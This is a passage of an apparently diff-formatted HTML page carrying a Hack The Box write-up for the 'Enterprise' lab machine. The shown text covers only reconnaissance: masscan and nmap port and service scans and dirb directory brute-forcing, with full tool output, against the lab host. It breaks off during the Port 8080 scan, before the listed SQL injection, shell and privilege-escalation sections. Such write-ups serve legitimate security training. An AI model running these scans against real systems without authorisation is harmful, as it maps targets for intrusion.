+    <a class="dropdown-toggle btn-danger" data-toggle="dropdown" href="https://alamot.github.io/enterprise_writeup/#" role="button" aria-haspopup="true" aria-expanded="false"><span lang="en">Contents</span><span lang="el">Περιεχόμενα</span> <i class="fa fa-caret-down" aria-hidden="true"></i></a>
+      <ul class="dropdown-menu scroll-menu">
+        <li><a href="https://alamot.github.io/enterprise_writeup/#title"><span lang="en">Start</span><span lang="el">Αρχή</span></a></li>
+        
+        
+        
+         
+<li><a href="https://alamot.github.io/enterprise_writeup/#introduction">Introduction</a></li>
+<li><a href="https://alamot.github.io/enterprise_writeup/#enumeration">Enumeration</a>
+<ul>
+<li><a href="https://alamot.github.io/enterprise_writeup/#port-scanning">Port scanning</a></li>
+<li><a href="https://alamot.github.io/enterprise_writeup/#brute-forcing-directories-and-files">Brute-forcing directories and files</a>
+<ul>
+<li><a href="https://alamot.github.io/enterprise_writeup/#port-80">Port 80</a></li>
+<li><a href="https://alamot.github.io/enterprise_writeup/#port-443">Port 443</a></li>
+<li><a href="https://alamot.github.io/enterprise_writeup/#port-8080">Port 8080</a></li>
+</ul></li>
+</ul></li>
+<li><a href="https://alamot.github.io/enterprise_writeup/#sql-injection">SQL Injection</a>
+<ul>
+<li><a href="https://alamot.github.io/enterprise_writeup/#dumping-the-wordpress-database">Dumping the wordpress database</a></li>
+<li><a href="https://alamot.github.io/enterprise_writeup/#dumping-the-joomladb-database">Dumping the joomladb database</a></li>
+</ul></li>
+<li><a href="https://alamot.github.io/enterprise_writeup/#getting-shells">Getting shells</a>
+<ul>
+<li><a href="https://alamot.github.io/enterprise_writeup/#getting-shell-on-wordpress-container">Getting shell on Wordpress container</a></li>
+<li><a href="https://alamot.github.io/enterprise_writeup/#getting-shell-on-joomla-container">Getting shell on Joomla container</a></li>
+</ul></li>
+<li><a href="https://alamot.github.io/enterprise_writeup/#privilege-escalation">Privilege escalation</a>
+<ul>
+<li><a href="https://alamot.github.io/enterprise_writeup/#escaping-from-the-joomla-container">Escaping from the Joomla container</a></li>
+<li><a href="https://alamot.github.io/enterprise_writeup/#getting-root">Getting root</a></li>
+<li><a href="https://alamot.github.io/enterprise_writeup/#autopwn-script">Autopwn script</a></li>
+</ul></li>
+ 
+      
+        <li><a href="https://alamot.github.io/enterprise_writeup/#posts-section"><span lang="en">See also</span><span lang="el">Δείτε επίσης</span></a></li>
+      </ul>
+    </li>
+   </ul>
+  
+   
+  <ul class="nav nav-pills">
+      <li><a class="p-logo" href="https://alamot.github.io/"><i class="fa fa-home" aria-hidden="true"></i> <span class="hidden768" lang="en">The Portal of Knowledge</span><span class="hidden768" lang="el">Η Πύλη της Γνώσης</span></a></li>
+  </ul>
+  
+  <ul class="nav nav-pills pull-right topmargin7"> 
+    <li id="lang-selector" role="presentation" class="dropdown">
+      <a id="lang-index" class="dropdown-toggle btn-primary" data-toggle="dropdown" href="https://alamot.github.io/enterprise_writeup/#" role="button" aria-haspopup="true" aria-expanded="false">Language <i class="fa fa-caret-down" aria-hidden="true"></i></a>
+      <ul class="dropdown-menu">
+        <li><a id="en" href="https://alamot.github.io/enterprise_writeup/#">English</a></li>
+        <li><a id="el" href="https://alamot.github.io/enterprise_writeup/#">Ελληνικά</a></li>
+      </ul>
+    </li>  
+  </ul>
+</div>
+</nav>
+<script>
+langtext = "English";
+language = localStorage.getItem('language');
+if (language) {
+  document.getElementById('mainbody').setAttribute('class', language);
+  document.getElementById('mainbody').setAttribute('lang', language);
+  if (language == 'el') { langtext="Ελληνικά"; }
+  document.getElementById("lang-index").innerHTML=langtext+' <i class="fa fa-caret-down" aria-hidden="true"></i>';
+}
+</script>
+
+
+
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="col-md-12">
+      <article class="single centered">
+        <div class="image" style="background-image: url(https://alamot.github.io/images/space.jpg);"></div>
+        <div class="body">
+            <header lang="en"><h1 id="title" class="title">Enterprise (Hack The Box) write-up</h1></header>
+            <header lang="el"><h1 class="title">Ανάλυση του Enterprise (Hack The Box)</h1></header>
+            <i class="fa fa-calendar topmargin7" aria-hidden="true"></i>  
+            <time lang="en" class="topmargin7">19 Mar 2018</time>
+            <time lang="el" class="topmargin7">19 Μαρ 2018</time>
+            · <i class="fa fa-folder-open-o topmargin7" aria-hidden="true"></i>
+            
+              <a class="label label-success topmargin7" href="https://alamot.github.io/categories/cybersecurity">
+                <span lang="en">Cybersecurity</span>
+                <span lang="el">Κυβερνοασφάλεια</span>
+              </a>
+            
+            · <i class="fa fa-tags topmargin7" aria-hidden="true"></i>
+            
+              <a class="label label-primary topmargin7" href="https://alamot.github.io/tags/hackthebox">
+                <span lang="en">hackthebox</span>
+                <span lang="el">hackthebox</span>
+                </a>
+            
+              <a class="label label-primary topmargin7" href="https://alamot.github.io/tags/windows">
+                <span lang="en">windows</span>
+                <span lang="el">windows</span>
+                </a>
+            
+         
+         <aside>
+          <section>
+            <header lang="en"><h2>Contents</h2></header>
+            <header lang="el"><h2>Περιεχόμενα</h2></header>
+            <div><nav id="TableOfContents">
+<ul>
+<li><a href="https://alamot.github.io/enterprise_writeup/#introduction">Introduction</a></li>
+<li><a href="https://alamot.github.io/enterprise_writeup/#enumeration">Enumeration</a>
+<ul>
+<li><a href="https://alamot.github.io/enterprise_writeup/#port-scanning">Port scanning</a></li>
+<li><a href="https://alamot.github.io/enterprise_writeup/#brute-forcing-directories-and-files">Brute-forcing directories and files</a>
+<ul>
+<li><a href="https://alamot.github.io/enterprise_writeup/#port-80">Port 80</a></li>
+<li><a href="https://alamot.github.io/enterprise_writeup/#port-443">Port 443</a></li>
+<li><a href="https://alamot.github.io/enterprise_writeup/#port-8080">Port 8080</a></li>
+</ul></li>
+</ul></li>
+<li><a href="https://alamot.github.io/enterprise_writeup/#sql-injection">SQL Injection</a>
+<ul>
+<li><a href="https://alamot.github.io/enterprise_writeup/#dumping-the-wordpress-database">Dumping the wordpress database</a></li>
+<li><a href="https://alamot.github.io/enterprise_writeup/#dumping-the-joomladb-database">Dumping the joomladb database</a></li>
+</ul></li>
+<li><a href="https://alamot.github.io/enterprise_writeup/#getting-shells">Getting shells</a>
+<ul>
+<li><a href="https://alamot.github.io/enterprise_writeup/#getting-shell-on-wordpress-container">Getting shell on Wordpress container</a></li>
+<li><a href="https://alamot.github.io/enterprise_writeup/#getting-shell-on-joomla-container">Getting shell on Joomla container</a></li>
+</ul></li>
+<li><a href="https://alamot.github.io/enterprise_writeup/#privilege-escalation">Privilege escalation</a>
+<ul>
+<li><a href="https://alamot.github.io/enterprise_writeup/#escaping-from-the-joomla-container">Escaping from the Joomla container</a></li>
+<li><a href="https://alamot.github.io/enterprise_writeup/#getting-root">Getting root</a></li>
+<li><a href="https://alamot.github.io/enterprise_writeup/#autopwn-script">Autopwn script</a></li>
+</ul></li>
+</ul>
+</nav></div>
+          </section>
+         </aside>
+        
+        
+
+<h1 id="introduction">Introduction</h1>
+
+<p><a href="https://www.hackthebox.com/machines/enterprise" target="_blank">https://www.hackthebox.com/machines/enterprise</a></p>
+
+<p>Enterprise is one of a challenging machine on Hack The Box. It features a custom wordpress plugin and a buffer overflow vulnerability that can be exploited both locally and remotely.</p>
+
+<h1 id="enumeration">Enumeration</h1>
+
+<h2 id="port-scanning">Port scanning</h2>
+
+<p>We scan the full range of TCP ports using masscan:
+</p><div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sudo masscan -e tun0 -p0-65535 --max-rate <span class="m">500</span> 10.10.10.61
+</span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2018-03-15 09:28:39 GMT
+</span></span></span><span class="line"><span class="cl"><span class="go"> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
+</span></span></span><span class="line"><span class="cl"><span class="go">Initiating SYN Stealth Scan
+</span></span></span><span class="line"><span class="cl"><span class="go">Scanning 1 hosts [65536 ports/host]
+</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 8080/tcp on 10.10.10.61                                   
+</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 443/tcp on 10.10.10.61                                    
+</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 80/tcp on 10.10.10.61                                     
+</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 22/tcp on 10.10.10.61                                     
+</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 32812/tcp on 10.10.10.61                                  
+</span></span></span><span class="line"><span class="cl"><span class="go">rate:  0.00-kpps, 100.00% done, waiting 0-secs, found=5
+</span></span></span></code></pre></div></div><p></p>
+
+<p>We found TCP ports 22, 80, 443, 8080 and 32812 open. Let’s explore them using nmap:</p>
+
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sudo nmap -A -p22,80,443,8080,32812 10.10.10.61
+</span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Starting Nmap 7.60 ( https://nmap.org ) at 2018-03-15 11:33 EET
+</span></span></span><span class="line"><span class="cl"><span class="go">Nmap scan report for 10.10.10.61
+</span></span></span><span class="line"><span class="cl"><span class="go">Host is up (0.10s latency).
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">PORT      STATE SERVICE  VERSION
+</span></span></span><span class="line"><span class="cl"><span class="go">22/tcp    open  ssh      (protocol 2.0)
+</span></span></span><span class="line"><span class="cl"><span class="go">| fingerprint-strings: 
+</span></span></span><span class="line"><span class="cl"><span class="go">|   NULL: 
+</span></span></span><span class="line"><span class="cl"><span class="go">|_    SSH-2.0-OpenSSH_7.4p1 Ubuntu-10
+</span></span></span><span class="line"><span class="cl"><span class="go">| ssh-hostkey: 
+</span></span></span><span class="line"><span class="cl"><span class="go">|   2048 c4:e9:8c:c5:b5:52:23:f4:b8:ce:d1:96:4a:c0:fa:ac (RSA)
+</span></span></span><span class="line"><span class="cl"><span class="go">|   256 f3:9a:85:58:aa:d9:81:38:2d:ea:15:18:f7:8e:dd:42 (ECDSA)
+</span></span></span><span class="line"><span class="cl"><span class="go">|_  256 de:bf:11:6d:c0:27:e3:fc:1b:34:c0:4f:4f:6c:76:8b (EdDSA)
+</span></span></span><span class="line"><span class="cl"><span class="go">80/tcp    open  http     Apache httpd 2.4.10 ((Debian))
+</span></span></span><span class="line"><span class="cl"><span class="go">|_http-generator: WordPress 4.8.1
+</span></span></span><span class="line"><span class="cl"><span class="go">|_http-server-header: Apache/2.4.10 (Debian)
+</span></span></span><span class="line"><span class="cl"><span class="go">|_http-title: USS Enterprise &amp;#8211; Ships Log
+</span></span></span><span class="line"><span class="cl"><span class="go">443/tcp   open  ssl/http Apache httpd 2.4.25 ((Ubuntu))
+</span></span></span><span class="line"><span class="cl"><span class="go">|_http-title: 400 Bad Request
+</span></span></span><span class="line"><span class="cl"><span class="go">| ssl-cert: Subject: commonName=enterprise.local/organizationName=USS Enterprise/stateOrProvinceName=United Federation of Planets/countryName=UK
+</span></span></span><span class="line"><span class="cl"><span class="go">| Not valid before: 2017-08-25T10:35:14
+</span></span></span><span class="line"><span class="cl"><span class="go">|_Not valid after:  2017-09-24T10:35:14
+</span></span></span><span class="line"><span class="cl"><span class="go">|_ssl-date: TLS randomness does not represent time
+</span></span></span><span class="line"><span class="cl"><span class="go">8080/tcp  open  http     Apache httpd 2.4.10 ((Debian))
+</span></span></span><span class="line"><span class="cl"><span class="go">|_http-generator: Joomla! - Open Source Content Management
+</span></span></span><span class="line"><span class="cl"><span class="go">|_http-open-proxy: Proxy might be redirecting requests
+</span></span></span><span class="line"><span class="cl"><span class="go">| http-robots.txt: 15 disallowed entries 
+</span></span></span><span class="line"><span class="cl"><span class="go">| /joomla/administrator/ /administrator/ /bin/ /cache/ 
+</span></span></span><span class="line"><span class="cl"><span class="go">| /cli/ /components/ /includes/ /installation/ /language/ 
+</span></span></span><span class="line"><span class="cl"><span class="go">|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
+</span></span></span><span class="line"><span class="cl"><span class="go">|_http-server-header: Apache/2.4.10 (Debian)
+</span></span></span><span class="line"><span class="cl"><span class="go">|_http-title: Home
+</span></span></span><span class="line"><span class="cl"><span class="go">32812/tcp open  unknown
+</span></span></span><span class="line"><span class="cl"><span class="go">| fingerprint-strings: 
+</span></span></span><span class="line"><span class="cl"><span class="go">|   GenericLines, GetRequest, HTTPOptions: 
+</span></span></span><span class="line"><span class="cl"><span class="go">|     _______ _______ ______ _______
+</span></span></span><span class="line"><span class="cl"><span class="go">|     |_____| |_____/ |______
+</span></span></span><span class="line"><span class="cl"><span class="go">|     |_____ |_____ | | | _ ______|
+</span></span></span><span class="line"><span class="cl"><span class="go">|     Welcome to the Library Computer Access and Retrieval System
+</span></span></span><span class="line"><span class="cl"><span class="go">|     Enter Bridge Access Code: 
+</span></span></span><span class="line"><span class="cl"><span class="go">|     Invalid Code
+</span></span></span><span class="line"><span class="cl"><span class="go">|     Terminating Console
+</span></span></span><span class="line"><span class="cl"><span class="go">|   NULL: 
+</span></span></span><span class="line"><span class="cl"><span class="go">|     _______ _______ ______ _______
+</span></span></span><span class="line"><span class="cl"><span class="go">|     |_____| |_____/ |______
+</span></span></span><span class="line"><span class="cl"><span class="go">|     |_____ |_____ | | | _ ______|
+</span></span></span><span class="line"><span class="cl"><span class="go">|     Welcome to the Library Computer Access and Retrieval System
+</span></span></span><span class="line"><span class="cl"><span class="go">|_    Enter Bridge Access Code:
+</span></span></span><span class="line"><span class="cl"><span class="go">2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span></span><span class="line"><span class="cl"><span class="go">==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+</span></span></span><span class="line"><span class="cl"><span class="go">SF-Port22-TCP:V=7.60%I=7%D=3/15%Time=5AAA3DEE%P=x86_64-pc-linux-gnu%r(NULL
+</span></span></span><span class="line"><span class="cl"><span class="go">SF:,20,"SSH-2\.0-OpenSSH_7\.4p1\x20Ubuntu-10\n");
+</span></span></span><span class="line"><span class="cl"><span class="go">==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+</span></span></span><span class="line"><span class="cl"><span class="go">SF-Port32812-TCP:V=7.60%I=7%D=3/15%Time=5AAA3DEE%P=x86_64-pc-linux-gnu%r(N
+</span></span></span><span class="line"><span class="cl"><span class="go">SF:ULL,ED,"\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
+</span></span></span><span class="line"><span class="cl"><span class="go">SF:x20\x20_______\x20_______\x20\x20______\x20_______\n\x20\x20\x20\x20\x2
+</span></span></span><span class="line"><span class="cl"><span class="go">SF:0\x20\x20\x20\x20\x20\|\x20\x20\x20\x20\x20\x20\|\x20\x20\x20\x20\x20\x
+</span></span></span><span class="line"><span class="cl"><span class="go">SF:20\x20\|_____\|\x20\|_____/\x20\|______\n\x20\x20\x20\x20\x20\x20\x20\x
+</span></span></span><span class="line"><span class="cl"><span class="go">SF:20\x20\x20\|_____\x20\|_____\x20\x20\|\x20\x20\x20\x20\x20\|\x20\|\x20\
+</span></span></span><span class="line"><span class="cl"><span class="go">SF:x20\x20\x20\\_\x20______\|\n\nWelcome\x20to\x20the\x20Library\x20Comput
+</span></span></span><span class="line"><span class="cl"><span class="go">SF:er\x20Access\x20and\x20Retrieval\x20System\n\nEnter\x20Bridge\x20Access
+</span></span></span><span class="line"><span class="cl"><span class="go">SF:\x20Code:\x20\n")%r(GenericLines,110,"\n\x20\x20\x20\x20\x20\x20\x20\x2
+</span></span></span><span class="line"><span class="cl"><span class="go">SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20_______\x20_______\x20\x20______\x
+</span></span></span><span class="line"><span class="cl"><span class="go">SF:20_______\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|\x20\x20\x20\x20\x
+</span></span></span><span class="line"><span class="cl"><span class="go">SF:20\x20\|\x20\x20\x20\x20\x20\x20\x20\|_____\|\x20\|_____/\x20\|______\n
+</span></span></span><span class="line"><span class="cl"><span class="go">SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|_____\x20\|_____\x20\x20\|\x2
+</span></span></span><span class="line"><span class="cl"><span class="go">SF:0\x20\x20\x20\x20\|\x20\|\x20\x20\x20\x20\\_\x20______\|\n\nWelcome\x20
+</span></span></span><span class="line"><span class="cl"><span class="go">SF:to\x20the\x20Library\x20Computer\x20Access\x20and\x20Retrieval\x20Syste
+</span></span></span><span class="line"><span class="cl"><span class="go">SF:m\n\nEnter\x20Bridge\x20Access\x20Code:\x20\n\nInvalid\x20Code\nTermina
+</span></span></span><span class="line"><span class="cl"><span class="go">SF:ting\x20Console\n\n")%r(GetRequest,110,"\n\x20\x20\x20\x20\x20\x20\x20\
+</span></span></span><span class="line"><span class="cl"><span class="go">SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_______\x20_______\x20\x20______
+</span></span></span><span class="line"><span class="cl"><span class="go">SF:\x20_______\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|\x20\x20\x20\x20
+</span></span></span><span class="line"><span class="cl"><span class="go">SF:\x20\x20\|\x20\x20\x20\x20\x20\x20\x20\|_____\|\x20\|_____/\x20\|______
+</span></span></span><span class="line"><span class="cl"><span class="go">SF:\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|_____\x20\|_____\x20\x20\|\
+</span></span></span><span class="line"><span class="cl"><span class="go">SF:x20\x20\x20\x20\x20\|\x20\|\x20\x20\x20\x20\\_\x20______\|\n\nWelcome\x
+</span></span></span><span class="line"><span class="cl"><span class="go">SF:20to\x20the\x20Library\x20Computer\x20Access\x20and\x20Retrieval\x20Sys
+</span></span></span><span class="line"><span class="cl"><span class="go">SF:tem\n\nEnter\x20Bridge\x20Access\x20Code:\x20\n\nInvalid\x20Code\nTermi
+</span></span></span><span class="line"><span class="cl"><span class="go">SF:nating\x20Console\n\n")%r(HTTPOptions,110,"\n\x20\x20\x20\x20\x20\x20\x
+</span></span></span><span class="line"><span class="cl"><span class="go">SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_______\x20_______\x20\x20___
+</span></span></span><span class="line"><span class="cl"><span class="go">SF:___\x20_______\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|\x20\x20\x20\
+</span></span></span><span class="line"><span class="cl"><span class="go">SF:x20\x20\x20\|\x20\x20\x20\x20\x20\x20\x20\|_____\|\x20\|_____/\x20\|___
+</span></span></span><span class="line"><span class="cl"><span class="go">SF:___\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|_____\x20\|_____\x20\x20
+</span></span></span><span class="line"><span class="cl"><span class="go">SF:\|\x20\x20\x20\x20\x20\|\x20\|\x20\x20\x20\x20\\_\x20______\|\n\nWelcom
+</span></span></span><span class="line"><span class="cl"><span class="go">SF:e\x20to\x20the\x20Library\x20Computer\x20Access\x20and\x20Retrieval\x20
+</span></span></span><span class="line"><span class="cl"><span class="go">SF:System\n\nEnter\x20Bridge\x20Access\x20Code:\x20\n\nInvalid\x20Code\nTe
+</span></span></span><span class="line"><span class="cl"><span class="go">SF:rminating\x20Console\n\n");
+</span></span></span><span class="line"><span class="cl"><span class="go">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+</span></span></span><span class="line"><span class="cl"><span class="go">Aggressive OS guesses: Linux 3.12 (95%), Linux 3.13 (95%), Linux 3.16 (95%), Linux 3.18 (95%), Linux 3.2 - 4.8 (95%), Linux 3.8 - 3.11 (95%), Linux 4.2 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%)
+</span></span></span></code></pre></div></div>
+
+<h2 id="brute-forcing-directories-and-files">Brute-forcing directories and files</h2>
+
+<h3 id="port-80">Port 80</h3>
+
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> dirb http://10.10.10.61/
+</span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">-----------------
+</span></span></span><span class="line"><span class="cl"><span class="go">DIRB v2.22    
+</span></span></span><span class="line"><span class="cl"><span class="go">By The Dark Raver
+</span></span></span><span class="line"><span class="cl"><span class="go">-----------------
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">START_TIME: Thu Mar 15 13:28:08 2018
+</span></span></span><span class="line"><span class="cl"><span class="go">URL_BASE: http://10.10.10.61/
+</span></span></span><span class="line"><span class="cl"><span class="go">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">-----------------
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">GENERATED WORDS: 4612                                                          
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">---- Scanning URL: http://10.10.10.61/ ----
+</span></span></span><span class="line"><span class="cl"><span class="go">+ http://10.10.10.61/index.php (CODE:301|SIZE:0)                                                                   
+</span></span></span><span class="line"><span class="cl"><span class="go">+ http://10.10.10.61/server-status (CODE:403|SIZE:299)                                                             
+</span></span></span><span class="line"><span class="cl"><span class="go">==&gt; DIRECTORY: http://10.10.10.61/wp-admin/                                                                        
+</span></span></span><span class="line"><span class="cl"><span class="go">==&gt; DIRECTORY: http://10.10.10.61/wp-content/                                                                      
+</span></span></span><span class="line"><span class="cl"><span class="go">==&gt; DIRECTORY: http://10.10.10.61/wp-includes/                                                                     
+</span></span></span><span class="line"><span class="cl"><span class="go">+ http://10.10.10.61/xmlrpc.php (CODE:405|SIZE:42)                                                                 
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">---- Entering directory: http://10.10.10.61/wp-admin/ ----
+</span></span></span><span class="line"><span class="cl"><span class="go">+ http://10.10.10.61/wp-admin/admin.php (CODE:302|SIZE:0)                                                          
+</span></span></span><span class="line"><span class="cl"><span class="go">==&gt; DIRECTORY: http://10.10.10.61/wp-admin/css/                                                                    
+</span></span></span><span class="line"><span class="cl"><span class="go">==&gt; DIRECTORY: http://10.10.10.61/wp-admin/images/                                                                 
+</span></span></span><span class="line"><span class="cl"><span class="go">==&gt; DIRECTORY: http://10.10.10.61/wp-admin/includes/                                                               
+</span></span></span><span class="line"><span class="cl"><span class="go">+ http://10.10.10.61/wp-admin/index.php (CODE:302|SIZE:0)                                                          
+</span></span></span><span class="line"><span class="cl"><span class="go">==&gt; DIRECTORY: http://10.10.10.61/wp-admin/js/                                                                     
+</span></span></span><span class="line"><span class="cl"><span class="go">==&gt; DIRECTORY: http://10.10.10.61/wp-admin/maint/                                                                  
+</span></span></span><span class="line"><span class="cl"><span class="go">==&gt; DIRECTORY: http://10.10.10.61/wp-admin/network/                                                                
+</span></span></span><span class="line"><span class="cl"><span class="go">==&gt; DIRECTORY: http://10.10.10.61/wp-admin/user/                                                                   
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">---- Entering directory: http://10.10.10.61/wp-content/ ----
+</span></span></span><span class="line"><span class="cl"><span class="go">+ http://10.10.10.61/wp-content/index.php (CODE:200|SIZE:0)                                                        
+</span></span></span><span class="line"><span class="cl"><span class="go">==&gt; DIRECTORY: http://10.10.10.61/wp-content/languages/                                                            
+</span></span></span><span class="line"><span class="cl"><span class="go">==&gt; DIRECTORY: http://10.10.10.61/wp-content/plugins/                                                              
+</span></span></span><span class="line"><span class="cl"><span class="go">==&gt; DIRECTORY: http://10.10.10.61/wp-content/themes/                                                               
+</span></span></span><span class="line"><span class="cl"><span class="go">==&gt; DIRECTORY: http://10.10.10.61/wp-content/upgrade/                                                              
+</span></span></span><span class="line"><span class="cl"><span class="go">==&gt; DIRECTORY: http://10.10.10.61/wp-content/uploads/                                                              
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">---- Entering directory: http://10.10.10.61/wp-includes/ ----
+</span></span></span><span class="line"><span class="cl"><span class="go">==&gt; DIRECTORY: http://10.10.10.61/wp-includes/certificates/                                                        
+</span></span></span><span class="line"><span class="cl"><span class="go">==&gt; DIRECTORY: http://10.10.10.61/wp-includes/css/                                                                 
+</span></span></span><span class="line"><span class="cl"><span class="go">==&gt; DIRECTORY: http://10.10.10.61/wp-includes/customize/                                                           
+</span></span></span><span class="line"><span class="cl"><span class="go">==&gt; DIRECTORY: http://10.10.10.61/wp-includes/fonts/                                                               
+</span></span></span><span class="line"><span class="cl"><span class="go">==&gt; DIRECTORY: http://10.10.10.61/wp-includes/images/
+</span></span></span></code></pre></div></div>
+                                                         
+
+<h3 id="port-443">Port 443</h3>
+
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> dirb https://10.10.10.61/
+</span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">-----------------
+</span></span></span><span class="line"><span class="cl"><span class="go">DIRB v2.22    
+</span></span></span><span class="line"><span class="cl"><span class="go">By The Dark Raver
+</span></span></span><span class="line"><span class="cl"><span class="go">-----------------
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">START_TIME: Thu Mar 15 12:13:24 2018
+</span></span></span><span class="line"><span class="cl"><span class="go">URL_BASE: https://10.10.10.61/
+</span></span></span><span class="line"><span class="cl"><span class="go">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">-----------------
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">GENERATED WORDS: 4612
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">---- Scanning URL: https://10.10.10.61/ ----
+</span></span></span><span class="line"><span class="cl"><span class="go">==&gt; DIRECTORY: https://10.10.10.61/files/
+</span></span></span><span class="line"><span class="cl"><span class="go">+ https://10.10.10.61/index.html (CODE:200|SIZE:10918)
+</span></span></span><span class="line"><span class="cl"><span class="go">+ https://10.10.10.61/server-status (CODE:403|SIZE:300)
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">---- Entering directory: https://10.10.10.61/files/ ----
+</span></span></span><span class="line"><span class="cl"><span class="go">(!) WARNING: Directory IS LISTABLE. No need to scan it.
+</span></span></span><span class="line"><span class="cl"><span class="go">    (Use mode '-w' if you want to scan it anyway)
+</span></span></span></code></pre></div></div>
+
+<h3 id="port-8080">Port 8080</h3>
+
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> dirb http://10.10.10.61:8080/
+</span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">-----------------
+</span></span></span><span class="line"><span class="cl"><span class="go">DIRB v2.22
+</span></span></span><span class="line"><span class="cl"><span class="go">By The Dark Raver
+</span></span></span><span class="line"><span class="cl"><span class="go">-----------------
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">START_TIME: Thu Mar 15 16:19:44 2018
+</span></span></span><span class="line"><span class="cl"><span class="go">URL_BASE: http://10.10.10.61:8080/
+</span></span></span><span class="line"><span class="cl"><span class="go">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">-----------------
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">GENERATED WORDS: 4612
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">---- Scanning URL: http://10.10.10.61:8080/ ----
+</span></span></span><span class="line"><span class="cl"><span class="go">+ http://10.10.10.61:8080/0 (CODE:200|SIZE:7678)
+</span></span></span><span class="line"><span class="cl"><span class="go">+ http://10.10.10.61:8080/01 (CODE:200|SIZE:8286)
+</span></span></span><span class="line"><span class="cl"><span class="go">+ http://10.10.10.61:8080/02 (CODE:200|SIZE:8595)
+</span></span></span><span class="line"><span class="cl"><span class="go">+ http://10.10.10.61:8080/1 (CODE:200|SIZE:8285)
+</span></span></span><span class="line"><span class="cl"><span class="go">+ http://10.10.10.61:8080/1x1 (CODE:200|SIZE:8287)
+</span></span></span><span class="line"><span class="cl"><span class="go">+ http://10.10.10.61:8080/2 (CODE:200|SIZE:8594)
